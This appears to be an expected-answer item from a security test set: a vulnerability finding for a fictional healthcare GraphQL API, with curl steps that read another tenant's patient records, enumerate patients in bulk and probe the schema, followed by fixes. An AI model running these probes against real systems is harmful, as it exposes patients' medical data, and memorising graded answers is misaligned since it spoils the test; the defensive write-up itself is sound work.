# Expected Response

## System
- Domain: Healthcare / EHR Platform
- System: PatientCore EHR API
- Example ID: GQL-0451

## Priority Findings

### Finding 1: GraphQL BOLA — Metadata/attribute side-channel (Pattern 2.2)
**Severity:** Critical
**Category:** BAC

**Summary:**
The GraphQL API at `POST /graphql` contains a Pattern 2.2 (Metadata/attribute side-channel) vulnerability.
An authenticated user belonging to `tenant-9635` can access or manipulate objects owned by
`tenant-eb99` by supplying a cross-tenant `patientId` in the GraphQL query/mutation.

**Evidence from HAR:**
- Request JWT claim `tenantId`: `tenant-9635`
- Response body `tenantId`: `tenant-eb99` — **mismatch confirms cross-tenant data access**
- Response HTTP status: `200 OK` — no authorization error raised by the resolver
- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-eb99`

**Root Cause:**
The resolver fetches the patient by `patientId` directly from the database without joining
against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
`tenantId` claim is never used as a WHERE clause predicate.

## Steps to Reproduce

### Step 1 — Establish attacker baseline
```bash
curl -s -X POST https://api.patientcore-ehr-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9635>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getPatient(id: \"P-1451\") { patientId tenantId ownerId data { sensitiveField } } }"}' 
```
**Expected baseline:** Returns `tenantId: "tenant-9635"` — this is the attacker's own object.

### Step 2 — Cross-tenant ID substitution
```bash
curl -s -X POST https://api.patientcore-ehr-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9635>" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { getPatient(id: \"P-2451\") { patientId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
```
**Vulnerable outcome:** Returns `tenantId: "tenant-eb99"` and full `sensitiveField` — **BOLA confirmed**.
**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.

### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
```bash
curl -s -X POST https://api.patientcore-ehr-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9635>" \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { bulkPatientLookup(ids: [\"P-2451\", \"P-3451\", \"P-4451\"]) { patientId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns objects from multiple tenants in a single response.

### Step 4 — Introspection probe (if Pattern 6.1 also present)
```bash
curl -s -X POST https://api.patientcore-ehr-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-9635>" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
```
**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.

## Secure Outcome Verification
For **Step 2**, the secure implementation MUST return:
```json
{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getPatient": null } }
```

## Remediation
1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE patientId = $id AND tenant_id = $jwtTenantId`.
2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
3. **Per-ID ownership filter for bulk operations:** In `bulkPatientLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
